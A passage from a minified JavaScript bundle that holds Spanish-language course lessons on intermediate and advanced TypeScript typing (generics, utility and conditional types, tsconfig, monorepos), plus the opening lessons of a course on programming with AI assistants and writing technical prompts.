* [ ] Uso de interfaces para objetos complejos.
* [ ] Cdigo libre de errores de sintaxis TS.
`,completed:!1,isProject:!0},{id:"ts-semi-senior-interfaces-vs-types",title:"Interfaces vs Types (Duelo de Gigantes)",level:"semi-senior",content:`# Leccin 12: Interfaces vs Types (Duelo de Gigantes)

Como Semi-Senior, ya no puedes decir "son casi lo mismo". Hay diferencias arquitectnicas que definen cmo escalar tu cdigo.

## 1. La Diferencia Tcnica: Declaration Merging
Las **Interfaces** pueden ser definidas varias veces y TS las unir automticamente. Los **Types** no.

### El Caso Correcto (Interfaces para Libreras):
\`\`\`typescript
interface User {
  name: string;
}

// En otro archivo...
interface User {
  role: 'admin' | 'user';
}

const me: User = { name: 'Octavio', role: 'admin' }; // OK - Se fusionaron
\`\`\`

### El Caso donde Gana Type (Uniones e Intersecciones):
Un type puede ser una unin de tipos, algo que una interfaz no puede modelar directamente.

\`\`\`typescript
type Status = 'loading' | 'success' | 'error';
type ID = string | number;
\`\`\`

## 2. Cul elegir? (Regla del Mentor)

- **USA INTERFACES** para definir la forma de los objetos, especialmente si van a ser extendidos o si ests exponiendo una API/Librera.
- **USA TYPES** para tipos de unin, tuplas, tipos primitivos complejos o cuando necesites usar utilidades de tipos avanzadas.

## 3. Comparacin: Extender vs Intersectar

### Incorrecto (Abuso de Interseccin):
\`\`\`typescript
type Animable = { animate: () => void };
type Visible = { show: () => void };
type UIElement = Animable & Visible & { id: string };
\`\`\`

### Correcto (Legibilidad con Extends):
\`\`\`typescript
interface UIElement extends Animable, Visible {
  id: string;
}
\`\`\`
*Tip:* Las interfaces suelen dar mejores mensajes de error y mejor performance en el compilador.

## 4. Ejercicio
Refactoriza un conjunto de tipos de unin para que usen un \`type\` y una estructura de datos de respuesta de API que use una \`interface\`.
`,completed:!1},{id:"ts-semi-senior-generics",title:"Generics (Cdigo Flexible y Seguro)",level:"semi-senior",content:`# Leccin 13: Generics (Cdigo Flexible y Seguro)

Los Generics son la herramienta principal para crear cdigo reutilizable sin caer en el temido \`any\`.

## 1. El Concepto: "Variables de Tipo"
Imagina una funcin que devuelve el primer elemento de un array.

### Mal (Any):
\`\`\`typescript
function getFirst(arr: any[]): any {
  return arr[0];
}
const val = getFirst([1, 2, 3]); // val es 'any', perdiste el tipado.
\`\`\`

### Bien (Generics):
\`\`\`typescript
function getFirst<T>(arr: T[]): T {
  return arr[0];
}
const val = getFirst([1, 2, 3]); // val es 'number'. TS lo infiri.
\`\`\`

## 2. Restricciones (Constraints)
A veces no quieres que \`T\` sea "cualquier cosa", sino que tenga ciertas propiedades.

\`\`\`typescript
interface HasId {
  id: string | number;
}

function logEntityId<T extends HasId>(entity: T) {
  console.log(entity.id); // OK, T garantiza tener 'id'
}
\`\`\`

## 3. Interfaces Genricas
Ideales para respuestas de API.

\`\`\`typescript
interface ApiResponse<Data> {
  status: number;
  data: Data;
  error?: string;
}

type UserResponse = ApiResponse<{ name: string; email: string }>;
\`\`\`

## 4. Ejercicio
Crea una clase genrica \`Storage<T>\` que tenga un mtodo \`add(item: T)\` y un mtodo \`getAll(): T[]\`.
Asegrate de que solo acepte objetos que tengan una propiedad \`createdAt: Date\`.
`,completed:!1},{id:"ts-semi-senior-enums-literals",title:"Enums vs Literal Unions (El Dilema)",level:"semi-senior",content:`# Leccin 14: Enums vs Literal Unions (El Dilema)

Como Semi-Senior, debes saber que los \`enums\` en TS generan cdigo en JS, a diferencia de la mayora de las caractersticas de TS.

## 1. El Problema de los Enums Numricos
Por defecto, los enums son numricos y son bidireccionales, lo que puede causar bugs silenciosos.

\`\`\`typescript
enum Direction { Up, Down }
console.log(Direction[0]); // "Up" - Realmente quieres acceso inverso por ndice?
\`\`\`

## 2. La Alternativa Pro: Const enums o String Unions
Para performance y limpieza, los String Literal Unions son los favoritos de la comunidad.

### Opcin A: String Literal Union (Recomendado)
\`\`\`typescript
type Role = 'ADMIN' | 'USER' | 'GUEST';

function setRole(role: Role) { ... }
\`\`\`

### Opcin B: Const Enum (Si necesitas legibilidad de objeto)
\`\`\`typescript
const enum Status {
  Active = 'ACTIVE',
  Inactive = 'INACTIVE'
}
\`\`\`
*Ventaja:* \`const enum\` no deja rastro en el JS final, se reemplaza por los valores literales.

## 3. Cundo usar cada uno?
- Usa **String Unions** para estados simples y props de componentes.
- Usa **Objects with as const** si necesitas iterar sobre las llaves en tiempo de ejecucin.

## 4. Ejercicio
Migra un sistema de "Prioridades" (1, 2, 3) a un sistema de String Literal Union ('LOW', 'MEDIUM', 'HIGH'). Explica por qu es ms mantenible.
`,completed:!1},{id:"ts-semi-senior-readonly-optional",title:"Readonly y Optional (Inmutabilidad y Flexibilidad)",level:"semi-senior",content:`# Leccin 15: Readonly y Optional (Inmutabilidad y Flexibilidad)

El control de acceso a las propiedades previene bugs de mutacin accidental.

## 1. Readonly: Blindando las propiedades
Indicas que una propiedad no puede ser reasignada despus de su creacin.

\`\`\`typescript
interface Config {
  readonly apiKey: string;
  readonly endpoint: string;
}

const conf: Config = { apiKey: '123', endpoint: '/api' };
conf.apiKey = '456'; // Error: Cannot assign to 'apiKey' because it is a read-only property.
\`\`\`

## 2. ReadonlyArray
Para evitar que alguien haga un \`.push()\` o \`.splice()\` en tus listas.

\`\`\`typescript
const numbers: ReadonlyArray<number> = [1, 2, 3];
numbers.push(4); // Error: Property 'push' does not exist on type 'readonly number[]'.
\`\`\`

## 3. Propiedades Opcionales (?): Manejo Seguro
Un Senior nunca asume que una propiedad opcional est ah sin chequearla.

### Mal (Acceso inseguro):
\`\`\`typescript
function printAge(user: { age?: number }) {
  console.log(user.age.toFixed()); // Runtime Error si es undefined
}
\`\`\`

### Bien (Optional Chaining):
\`\`\`typescript
function printAge(user: { age?: number }) {
  console.log(user.age?.toFixed()); 
}
\`\`\`

## 4. Ejercicio
Crea una interfaz \`AppState\` con propiedades \`readonly\` y un mtodo que intente mutarlas. Observa cmo TS te protege.
`,completed:!1},{id:"ts-semi-senior-type-guards",title:"Narrowing y Type Guards (Domando la Incertidumbre)",level:"semi-senior",content:`# Leccin 16: Narrowing y Type Guards (Domando la Incertidumbre)

Narrowing es el proceso en el que TS reduce un tipo amplio (ej: \`string | number\`) a uno especfico.

## 1. Type Guards Nativos
Usa \`typeof\` para primitivos e \`instanceof\` para clases.

\`\`\`typescript
function process(val: string | number) {
  if (typeof val === 'string') {
    return val.toUpperCase(); // TS ya sabe que es string
  }
}
\`\`\`

## 2. User-Defined Type Guards (El Operador \`is\`)
A veces necesitas lgica personalizada para saber si un objeto es de un tipo.

### Caso Real:
\`\`\`typescript
interface Bird { fly: () => void }
interface Fish { swim: () => void }

// Type Guard personalizado
function isFish(pet: Bird | Fish): pet is Fish {
  return (pet as Fish).swim !== undefined;
}

function move(pet: Bird | Fish) {
  if (isFish(pet)) {
    pet.swim(); // OK
  } else {
    pet.fly(); // OK
  }
}
\`\`\`

## 3. El operador \`in\`
Ideal para objetos literales o interfaces.

\`\`\`typescript
function processEvent(event: MouseEvent | KeyboardEvent) {
  if ('key' in event) {
    console.log(event.key); // Es KeyboardEvent
  }
}
\`\`\`

## 4. Ejercicio
Crea un sistema que reciba "Notificaciones". La notificacin puede ser \`Email\` o \`SMS\`. Cada una tiene propiedades distintas. Crea un Type Guard para distinguirlas sin usar \`any\`.
`,completed:!1},{id:"ts-semi-senior-utility-types",title:"Utility Types (El Kit de Herramientas)",level:"semi-senior",content:"# Leccin 17: Utility Types (El Kit de Herramientas)\n\nTS trae herramientas integradas para transformar tipos. Un Semi-Senior las usa a diario.\n\n## 1. `Partial<T>` y `Required<T>`\nConvierte todas las propiedades en opcionales u obligatorias.\n\n```typescript\ninterface User { id: number; name: string; email: string }\n\n// Ideal para funciones de actualizacin (PATCH)\nfunction updateUser(id: number, fields: Partial<User>) {\n  // fields puede tener solo 'name', o solo 'email', etc.\n}\n```\n\n## 2. `Pick<T, Keys>` y `Omit<T, Keys>`\nSelecciona o descarta propiedades.\n\n```typescript\ntype UserPreview = Pick<User, 'id' | 'name'>;\ntype UserWithoutEmail = Omit<User, 'email'>;\n```\n\n## 3. `Record<Keys, Type>`\nIdeal para diccionarios o mapas de objetos.\n\n```typescript\nconst usersById: Record<number, User> = {\n  1: { id: 1, name: 'Ana', email: '...' },\n  2: { id: 2, name: 'Beto', email: '...' }\n};\n```\n\n## 4. `Readonly<T>`\nConvierte todo el objeto en inmutable de un solo golpe.\n\n## 5. Ejercicio\nTienes un objeto `Config` gigante. Crea un tipo `UserConfig` que tome `Config`, pero le quite las propiedades de base de datos (`host`, `port`) y haga que el resto sean opcionales.\n",completed:!1},{id:"ts-semi-senior-tsconfig",title:"tsconfig y Estrategias de Compilacin",level:"semi-senior",content:'# Leccin 18: tsconfig y Estrategias de Compilacin\n\nConfigurar bien tu proyecto es la diferencia entre un cdigo seguro y uno que "parece" TypeScript pero tiene bugs.\n\n## 1. Las llaves sagradas de `strict`\nEstar en `strict: true` enciende:\n- `noImplicitAny`: No permite `any` accidental.\n- `strictNullChecks`: Te obliga a manejar el `null` y `undefined`.\n- `strictFunctionTypes`: Valida firmas de funciones con rigor.\n\n## 2. Resolviendo Paths (`paths`)\nEvita los imports relativos infinitos: `import { x } from \'../../../../components/x\'`.\n\n```json\n{\n  "compilerOptions": {\n    "baseUrl": ".",\n    "paths": {\n      "@components/*": ["src/components/*"],\n      "@hooks/*": ["src/hooks/*"]\n    }\n  }\n}\n```\n\n## 3. `skipLibCheck`\nAcelera la compilacin ignorando los errores de tipos dentro de `node_modules`. (T no puedes arreglar los errores de otros, verdad?).\n\n## 4. `target` vs `lib`\n- **Target:** A qu versin de JS vas a emitir (ej: ESNext, ES6).\n- **Lib:** Qu caractersticas del entorno vas a usar (ej: ["DOM", "ESNext"]).\n\n## 5. Desafo\nInvestiga qu hace `noUnusedLocals` y `noUnusedParameters`. Incorpralos a tu flujo de trabajo para tener un cdigo ms limpio.\n',completed:!1},{id:"ts-semi-senior-arquitectura-tipos",title:"Arquitectura y Organizacin de Tipos",level:"semi-senior",content:`# Leccin 19: Arquitectura y Organizacin de Tipos

Un proyecto Senior no tiene tipos desparramados por todos lados.

## 1. Co-location vs Global Types
- **Co-location:** Si un tipo solo se usa en un componente, gurdalo en el archivo del componente.
- **Shared Types:** Si se usa en 3 o ms lugares, muvelo a un archivo central.

### Estructura Recomendada:
\`\`\`
src/
  types/
    index.ts (barrel file)
    user.types.ts
    api.types.ts
  components/
    UserCard/
      UserCard.tsx
      UserCard.types.ts (Solo para este componente)
\`\`\`

## 2. Barrel Files
Usa \`index.ts\` para exportar todo de una carpeta y facilitar los imports.

\`\`\`typescript
// types/index.ts
export * from './user.types';
export * from './api.types';
\`\`\`

## 3. Evita los Namespaces
Fueron tiles en el pasado, pero hoy en da los **ES Modules** (import/export) son el estndar y funcionan mejor con los bundlers modernos.

## 4. Tipado de Terceros (\`@types\`)
Si una librera no tiene tipos, bscala en **DefinitelyTyped**:
\`npm install -D @types/nombre-libreria\`

## 5. Ejercicio
Organiza los tipos de un pequeo sistema de Blog (Post, Comentario, Autor) usando la estructura sugerida.
`,completed:!1},{id:"ts-semi-senior-ejercicios",title:"Desafo Tcnico Semi-Senior",level:"semi-senior",content:`# Leccin 20: Desafo Tcnico Semi-Senior

Es hora de aplicar todo lo aprendido en un caso de produccin real.

## El Escenario: Generic API Manager
Necesitamos crear una funcin que maneje peticiones a una API de manera genrica, que maneje errores y que devuelva los datos tipados.

**Tu misin es implementar la funcin \`request\`:**

### Requisitos:
1.  Debe ser **Genrica**. T le pasas el tipo de datos que esperas.
2.  Debe aceptar una URL y un objeto de configuracin opcional.
3.  Debe devolver una **Promesa** con una unin: \`Result<T>\`.
4.  Define \`Result<T>\` como un Type que puede ser:
    - Success: \`{ status: 'success', data: T }\`
    - Error: \`{ status: 'error', message: string }\`
5.  Usa un **Type Guard** para verificar si la respuesta fue exitosa antes de usar los datos.

### Esqueleto Inicial:
\`\`\`typescript
type Result<T> = ...

async function request<T>(url: string): Promise<Result<T>> {
  // Implementacin aqu
}

// Ejemplo de uso esperado:
const res = await request<User[]>('/api/users');
if (res.status === 'success') {
  console.log(res.data.length); // OK
}
\`\`\`

---

## Criterios de Aprobacin
- [ ] No usaste \`any\`.
- [ ] Usaste Generics correctamente.
- [ ] El Type Guard funciona y permite el Narrowing.
- [ ] Cdigo limpio y documentado con comentarios.

Buena suerte, desarrollador!
`,completed:!1,isProject:!0},{id:"ts-semi-senior-evaluacion",title:"Evaluacin: TypeScript Semi-Senior",level:"semi-senior",content:`# Evaluacin Final: TypeScript Semi-Senior

Demuestra tu conocimiento en genricos, utilitarios y tcnicas de narrowing para cdigo profesional.

## 1. Examen Terico
*   Cundo preferiras usar un \`type\` sobre una \`interface\`? Menciona al menos dos casos.
*   Explica qu hace el operador \`is\` en la firma de una funcin.
*   Qu ventaja tiene \`ReadonlyArray<T>\` sobre un array normal?

## 2. Ejercicio Prctico: Wrapper de API Genrico
Crea una funcin llamada \`fetchData<T>(url: string)\` que:
1. Realice un \`fetch\` a la URL.
2. Devuelva los datos tipados como \`T\`.
3. Maneje errores y los devuelva en un formato consistente.

## 3. Desafo Real: El Filtro Inteligente
Tienes una lista de usuarios con diferentes roles ('admin', 'editor', 'viewer').
Crea una funcin genrica \`filtrarPorPropiedad<T, K extends keyof T>(lista: T[], llave: K, valor: T[K])\` que devuelva los elementos filtrados.
*   Asegrate de que la "llave" solo pueda ser una propiedad existente del objeto.

## 4. Criterios de Aprobacin
* [ ] Implementacin exitosa de Generics.
* [ ] Uso correcto de Type Constraints (\`extends keyof\`).
* [ ] Manejo de inmutabilidad donde sea necesario.
* [ ] Cdigo altamente reutilizable y flexible.
`,completed:!1,isProject:!0},{id:"ts-senior-advanced-generics",title:"Advanced Generics & Constraints",level:"senior",content:`# Leccin 21: Advanced Generics & Constraints

En el nivel Senior, los genricos no solo sirven para reutilizar funciones, sino para crear **contratos de tipos dinmicos** que se adaptan a la entrada del desarrollador.

## 1. Genricos de Rango Mltiple
A menudo necesitamos que un tipo genrico interacte con otro.

\`\`\`typescript
function merge<T extends object, U extends object>(objA: T, objB: U): T & U {
  return { ...objA, ...objB };
}
\`\`\`

## 2. El operador \`keyof\`
Fundamental para asegurar que estamos accediendo a propiedades que realmente existen.

\`\`\`typescript
function getProperty<T extends object, K extends keyof T>(obj: T, key: K): T[K] {
  return obj[key];
}

const user = { id: 1, name: 'Octavio' };
getProperty(user, 'name'); // OK: retorna string
getProperty(user, 'email'); // Error: 'email' no existe en 'user'
\`\`\`

## 3. Clases Genricas Abstractas
Ideal para definir la base de un servicio que maneja diferentes entidades.

\`\`\`typescript
abstract class BaseService<T> {
  protected items: T[] = [];
  abstract findById(id: string | number): T | undefined;
}
\`\`\`

## 4. Pregunta de Entrevista Senior
**P:** "Cul es la diferencia entre usar \`any\`, \`unknown\` y un genrico \`T\`?"
**R:** \`any\` apaga el compilador. \`unknown\` es un tipo seguro que te obliga a validar antes de usar. Un genrico \`T\` **conserva la identidad del tipo** a travs de la funcin, permitiendo que la salida dependa exactamente de la entrada.

## 5. Desafo
Implementa una funcin \`pluck\` que tome un array de objetos y una llave, y devuelva un array con los valores de esa llave, manteniendo el tipado exacto del valor.
`,completed:!1},{id:"ts-senior-conditional-types",title:"Conditional Types & Infer",level:"senior",content:`# Leccin 22: Conditional Types & Infer

Los tipos condicionales permiten que la lgica de programacin entre al sistema de tipos.

## 1. Sintaxis Ternaria de Tipos
\`SomeType extends OtherType ? TrueType : FalseType\`

\`\`\`typescript
type IsString<T> = T extends string ? true : false;

type A = IsString<"hola">; // true
type B = IsString<42>;     // false
\`\`\`

## 2. El poder de \`infer\`
\`infer\` permite declarar una variable de tipo dentro de una condicin para "extraer" informacin.

### Caso Real: Extraer el tipo de retorno de una funcin
\`\`\`typescript
type GetReturnType<T> = T extends (...args: any[]) => infer R ? R : never;

function greeting() { return "Hello!"; }
type GreetingReturn = GetReturnType<typeof greeting>; // string
\`\`\`

## 3. Distribucin de Tipos Condicionales
Cuando pasas una unin a un tipo condicional, TS lo aplica a cada miembro de la unin.

\`\`\`typescript
type ToArray<T> = T extends any ? T[] : never;
type StringOrNumberArray = ToArray<string | number>; // string[] | number[]
\`\`\`

## 4. Caso de Produccin: API Error Handling
Imagina un tipo que extrae el tipo de los datos solo si la respuesta de la API no es un error.

\`\`\`typescript
type UnpackResponse<T> = T extends { data: infer D } ? D : T;
\`\`\`

## 5. Desafo Tcnico
Crea un tipo \`DeepNonNullable<T>\` que elimine \`null\` y \`undefined\` de todas las propiedades de un objeto, incluso en objetos anidados.
`,completed:!1},{id:"ts-senior-mapped-types",title:"Mapped Types & Template Literals",level:"senior",content:`# Leccin 23: Mapped Types & Template Literals

Los Mapped Types permiten transformar un tipo existente en uno nuevo, propiedad por propiedad.

## 1. Sintaxis Bsica
\`\`\`typescript
type ReadonlyUser<T> = {
  readonly [P in keyof T]: T[P];
};
\`\`\`

## 2. Mapeo con Remapeo de Llaves (\`as\`)
Podemos prefijar o transformar los nombres de las propiedades.

\`\`\`typescript
interface User {
  id: number;
  name: string;
}

type Getters<T> = {
  [K in keyof T as \`get\${Capitalize<K & string>}\`]: () => T[K];
};

type UserGetters = Getters<User>;
/* Genera:
{
  getId: () => number;
  getName: () => string;
} 
*/
\`\`\`

## 3. Template Literal Types
Introducidos en TS 4.1, permiten manipular strings a nivel de tipos.

\`\`\`typescript
type Environment = "prod" | "dev" | "staging";
type Port = 80 | 443 | 3000;

type Url = \`https://\${Environment}.myapp.com:\${Port}\`;
\`\`\`

## 4. Caso Real: Event Emitters Estrictos
\`\`\`typescript
type Events = "click" | "hover" | "scroll";
type Handler = \`on\${Capitalize<Events>}\`; // "onClick" | "onHover" | "onScroll"
\`\`\`

## 5. Desafo
Crea un mapped type que tome una interfaz y haga que todas sus propiedades sean opcionales, excepto las que comiencen con la palabra "id".
`,completed:!1},{id:"ts-senior-api-library-typing",title:"Tipado Avanzado de APIs y Libreras",level:"senior",content:`# Leccin 24: Tipado Avanzado de APIs y Libreras

Disear tipos para el consumo de otros desarrolladores requiere un enfoque de "Cero Friccin".

## 1. Discriminated Unions (Pattern Matching)
Es el estndar de oro para respuestas de API y estados de UI.

\`\`\`typescript
type ApiResponse<T> = 
  | { status: 'success'; data: T; timestamp: number }
  | { status: 'error'; message: string; code: number }
  | { status: 'loading' };

function handleResponse(res: ApiResponse<User[]>) {
  switch(res.status) {
    case 'success':
      console.log(res.data); // Tipado exacto
      break;
    case 'error':
      console.error(res.message); // Tipado exacto
      break;
  }
}
\`\`\`

## 2. Branded Types (Nominal Typing)
TS es estructural. A veces queremos evitar que se mezclen IDs de diferentes entidades aunque ambos sean \`string\`.

\`\`\`typescript
type UserId = string & { __brand: "UserId" };
type PostId = string & { __brand: "PostId" };

function deleteUser(id: UserId) { ... }

const pid = "123" as PostId;
deleteUser(pid); // Error: PostId no es asignable a UserId
\`\`\`

## 3. Tipado de Terceros: Module Augmentation
Si una librera externa le falta un tipo en una propiedad que t inyectaste.

\`\`\`typescript
import "express-session";

declare module "express-session" {
  interface SessionData {
    user: { id: number; role: string };
  }
}
\`\`\`

## 4. Pregunta de Entrevista
**P:** "Cmo evitas que un programador use \`any\` en una librera que ests exportando?"
**R:** Usando \`unknown\` para datos de entrada de los que no estamos seguros y forzando Type Guards, o usando Generics con restricciones estrictas.

## 5. Caso de Produccin
Un SDK de pagos que debe asegurar que el monto nunca sea negativo y que la moneda sea una de las permitidas por el banco central.
`,completed:!1},{id:"ts-senior-monorepos-production",title:"TypeScript en Monorepos y Arquitectura Escalable",level:"senior",content:`# Leccin 25: TypeScript en Monorepos y Arquitectura Escalable

A medida que el equipo crece, la gestin de tipos entre mltiples paquetes se vuelve crtica.

## 1. Project References (\`tsconfig.json\`)
Permite que un proyecto de TS dependa de otro, compilndolos de forma independiente y eficiente.

\`\`\`json
{
  "compilerOptions": {
    "composite": true,
    "declaration": true
  ,
  "references": [
    { "path": "../common-types" },
    { "path": "../ui-library" }
  ]
}
\`\`\`

## 2. Compartiendo Tipos mediante Paquetes Duales
En arquitecturas Clean/Hexagonal, los tipos (DTOs/Domain Entities) deben vivir en un paquete agnstico que tanto el Frontend como el Backend puedan importar.

## 3. Errores Crticos en Produccin (Case Studies)

### Caso A: El "As Const" Olvidado
En un sistema de routing, se us un array de strings para las rutas permitidas. Al no usar \`as const\`, TS lo infiri como \`string[]\`, permitiendo rutas inexistentes en tiempo de ejecucin.
**Resolucin:** Cambiar a \`const ROUTES = [...] as const;\`.

### Caso B: Serialization Loss
Se enviaron objetos \`Date\` a travs de una API. En el cliente, TS deca que eran \`Date\`, pero JSON los convirti en \`string\`. El frontend crashe al intentar usar \`.getTime()\`.
**Leccin:** Las interfaces de API deben reflejar el transporte (JSON), no el objeto de dominio del lenguaje.

## 4. Prevencin de Regresiones
Usa \`tsd\` o \`dtslint\` en tu CI/CD para testear que tus tipos no se rompan ante cambios accidentales en la arquitectura.

## 5. Desafo Final
Disea la estructura de \`tsconfig\` para un monorepo con un paquete \`core-logic\` (Shared), un \`mobile-app\` (React Native) y un \`web-dashboard\` (Vite).
`,completed:!1},{id:"ts-senior-recursive-types",title:"Recursive Types & Deep Utilities",level:"senior",content:`# Leccin 26: Recursive Types & Deep Utilities

En la cima del dominio de TypeScript, nos encontramos con estructuras que se referencian a s mismas. Esto es vital para manejar datos arbreos como el DOM, sistemas de archivos o JSON anidado.

## 1. Tipos Recursivos Bsicos
Define un tipo que puede contenerse a s mismo.

\`\`\`typescript
type JSONValue =
  | string
  | number
  | boolean
  | null
  | { [key: string]: JSONValue }
  | JSONValue[];

const data: JSONValue = {
  name: "Project",
  meta: {
    tags: ["typescript", "advanced"],
    version: 1.0
  }
};
\`\`\`

## 2. Deep Partial y Deep Readonly
Los utilitarios nativos de TS (\`Partial\`, \`Readonly\`) son "shallow" (superficiales). Solo afectan al primer nivel. Para un objeto anidado, necesitamos recursividad.

\`\`\`typescript
type DeepReadonly<T> = {
  readonly [P in keyof T]: T[P] extends object
    ? DeepReadonly<T[P]>
    : T[P];
};

interface User {
  id: number;
  profile: {
    bio: string;
    social: { twitter: string };
  };
}

const user: DeepReadonly<User> = { ... };
user.profile.social.twitter = "@new"; // Error: Propiedad de solo lectura
\`\`\`

## 3. Aplanando Objetos (Key Paths)
Un truco avanzado de Senior es generar un tipo que represente todos los caminos posibles a una propiedad usando Template Literals.

\`\`\`typescript
type PathInto<T> = T extends object ? {
  [K in keyof T]: \`\${K & string}\` | \`\${K & string}.\${PathInto<T[K]>}\`
}[keyof T] : never;

type UserPaths = PathInto<User>; 
// "id" | "profile" | "profile.bio" | "profile.social" | "profile.social.twitter"
\`\`\`

## 4. Caso de Uso: Libreras de Validacin
Libreras como Zod o Yup usan estas tcnicas para inferir tipos de esquemas complejos sin que t tengas que escribirlos dos veces.

## 5. Ejercicio
Crea un tipo \`DeepNestedArray<T>\` que permita arrays dentro de arrays a cualquier nivel de profundidad (ej: \`[1, [2, [3, 4]]]\`).
`,completed:!1},{id:"ts-senior-evaluacion",title:"Evaluacin: TypeScript Senior Architect",level:"senior",content:`# Evaluacin Final: TypeScript Senior Architect

Esta evaluacin pone a prueba tu capacidad para disear sistemas de tipos complejos que garantizan seguridad y escalabilidad.

## Seccin 1: Desafo de Tipado de API (TypeScript Puro)

Disea un sistema de tipos para un "Query Builder".
Debe permitir encadenar mtodos como \`select\`, \`where\` y \`orderBy\`, y solo permitir seleccionar opciones que existan en la interfaz del modelo pasado.

\`\`\`typescript
interface User {
  id: number;
  name: string;
  email: string;
}

const query = createQuery<User>();
query.select("name").where("id", 1).orderBy("email"); // Valido
query.select("password"); // ERROR: 'password' no existe en User
\`\`\`

## Seccin 2: Anlisis de Performance del Compilador

**Escenario:** Tu proyecto tiene 2000 archivos TS y el tiempo de compilacin es de 5 minutos.
**Preguntas:**
1. Cmo usaras \`tsc --incremental\` para ayudar?
2. Qu impacto tiene abusar de los \`DeepPartial\` recursivos en el tiempo de type-checking?
3. Explica el uso de Project References para aislar mdulos lentos.

## Seccin 3: Refactor de Librera Legacy

Tienes una librera de procesamiento de datos que usa \`any\` en todas sus funciones de transformacin.
**Misin:** Propn una estrategia de refactorizacin usando Generics y Conditional Types para que los desarrolladores que consumen la librera recuperen el autocompletado y la seguridad sin tener que reescribir toda la lgica interna de inmediato.

## Seccin 4: Debugging en Produccin

**Bug:** Un cliente reporta que al cargar un perfil de usuario, la aplicacin parpadea y muestra datos del usuario anterior por un milisegundo antes de crashear.
**Sospecha:** Una "Race Condition" en una promesa que no fue cancelada y un tipado que asume que el objeto \`profile\` nunca es \`null\` (cuando en realidad es \`null\` mientras carga).
**Solucin Senior:** Implementar un estado de \`Union Discriminated\` que incluya un estado \`idle\`, \`loading\`, \`success\` y \`error\`.

---

## Criterios de Aprobacin
* [ ] Domino absoluto de Conditional Types y Mapped Types.
* [ ] Soluciones arquitectnicas que priorizan la mantenibilidad del equipo.
* [ ] Conocimiento de las tripas del compilador (Performance).
* [ ] Capacidad de diagnstico de errores sutiles en entornos distribuidos (Monorepos/APIs).
`,completed:!1,isProject:!0}]},Xx={id:"vibecoding",title:"Vibecoding: Programacin con IA",description:"Domina el arte de dirigir Inteligencias Artificiales para crear software profesional a velocidades increbles.",completed:!1,track:"Nuevas Tecnologas",lessons:[{id:"vibe-01-que-es",title:"Qu es Vibecoding?",level:"junior",content:`# Leccin 1: Qu es Vibecoding realmente?

A menudo se confunde el uso de la IA en programacin con simplemente dejar que una mquina escriba por nosotros. El **Vibecoding** es un trmino moderno que describe un cambio de paradigma: el desarrollador ya no es solo quien escribe cada lnea de sintaxis, sino quien **dirige el flujo creativo y tcnico** de la aplicacin.

## 1. El Concepto de "Vibe"
No se trata de "sentimientos" vagos, sino de la capacidad de mantener una **visin de alto nivel** de lo que se quiere construir mientras se utiliza la IA para manejar la implementacin de bajo nivel.

*   **Programacin Tradicional:** Te preocupas por dnde va el punto y coma, el nombre exacto de la funcin y la lgica del bucle.
*   **Vibecoding:** Te preocupas por la arquitectura, la UX, el flujo de datos y cmo interactan las piezas. La IA se encarga de la sintaxis "tediosa".

## 2. El Origen del Trmino
El trmino surgi en comunidades de desarrolladores que utilizan herramientas como Perplexity, Cursor o Claude para construir aplicaciones complejas en horas, no semanas. Lo llaman "vibe" porque "se siente" como si estuvieras moldeando el software con palabras en lugar de picar piedra.

## 3. Por qu es el futuro?
La velocidad de desarrollo est aumentando exponencialmente. Un programador que sabe usar la IA es 10 veces ms productivo que uno que no. Sin embargo, para hacer "Vibecoding" real, **debes saber programar**.

> **Si no sabes programar, no puedes juzgar si la IA te est enviando a un precipicio tcnico.**

---

### Misin Junior:
Define con tus propias palabras qu prefieres: ser el "escritor" (tradicional) o el "director" (vibecoder). Explica por qu crees que entender la lgica bsica sigue siendo vital aunque la IA escriba el cdigo.
`,completed:!1},{id:"vibe-02-dirigir",title:"Dirigir vs Copiar",level:"junior",content:`# Leccin 2: Dirigir vs Copiar

El mayor error de un principiante es ver a la IA como un "copia-pega" avanzado de Stack Overflow. Esto lleva a aplicaciones frgiles que nadie entiende.

## 1. El Riesgo de Copiar sin Criterio
Cuando copias cdigo de una IA sin entenderlo:
*   **Deuda Tcnica Sugerida:** La IA puede sugerir patrones antiguos o ineficientes si el prompt no es claro.
*   **Imposibilidad de Debug:** Si algo falla, no sabes dnde mirar porque no "escribiste" la lgica.
*   **Alucinaciones:** La IA puede inventar mtodos que no existen en una librera.

## 2. El Arte de Dirigir
Dirigir significa tratar a la IA como un **Senior Developer** que trabaja para ti. T eres el **Arquitecto**.
*   **T decides el "Qu":** "Quiero un sistema de autenticacin que use JWT y guarde el estado en LocalStorage".
*   **T revisas el "Cmo":** La IA te da el cdigo. T lo lees. Si usa una librera que no quieres, la corriges: "No uses \`axios\`, usa \`fetch\` nativo".
*   **T validas:** Pruebas cada pieza antes de integrarla.

## 3. El Ciclo de Retroalimentacin
Dirigir es un dilogo constante:
1.  **Instruccin:** Clara y con contexto.
2.  **Generacin:** La IA propone.
3.  **Anlisis:** T evalas (Pensamiento Crtico).
4.  **Ajuste:** "Esto est bien, pero refactoriza la funcin para que sea ms legible".

---

### Misin Junior:
Busca en ChatGPT/Claude un cdigo para "Validar un email en JavaScript".
1.  Copia el cdigo.
2.  Pregntale a la IA: "Por qu usaste ese Regex?".
3.  Pdele: "Explcame paso a paso cmo funciona la lgica".
Si solo copiaste el regex sin entenderlo, ests fallando. Si preguntaste el por qu, ests *dirigiendo*.
`,completed:!1},{id:"vibe-03-prompts",title:"Estructura de Prompts",level:"junior",content:`# Leccin 3: Cmo estructurar Prompts Tcnicos

Un prompt tcnico no es una pregunta, es una **especificacin de requerimientos**.

## 1. La Frmula del Prompt Perfecto
Un buen prompt debe tener al menos estos 4 elementos:

1.  **Rol:** Quin es la IA (ej: "Acta como un experto en React y Clean Code").
2.  **Contexto:** Qu estamos haciendo (ej: "Estamos construyendo un dashboard de ventas para una tienda de mascotas").
3.  **Tarea:** Qu quieres exactamente (ej: "Genera un componente de tarjeta que muestre el nombre del producto, precio y una imagen").
4.  **Restricciones/Formato:** Reglas (ej: "Usa Tailwind CSS, no uses libreras externas de iconos, asegrate de que sea accesible con lectores de pantalla").

## 2. Ejemplo Comparativo

*   **Prompt Malo:** "Hazme una lista de productos en React".
    *   *Resultado:* Cdigo genrico, estilos feos, nombres de variables al azar.
*   **Prompt de Vibecoder:**
    > "Acta como un desarrollador Frontend Senior. Necesito un componente \`ProductList.jsx\` que reciba un array de objetos desde las props. Cada objeto tiene \`id\`, \`name\`, \`price\` y \`category\`. Usa Tailwind para el grid (3 columnas en desktop, 1 en mobile). Si el precio es mayor a 100, muestra un badge de 'Premium'. El cdigo debe ser modular y seguir los principios SOLID."

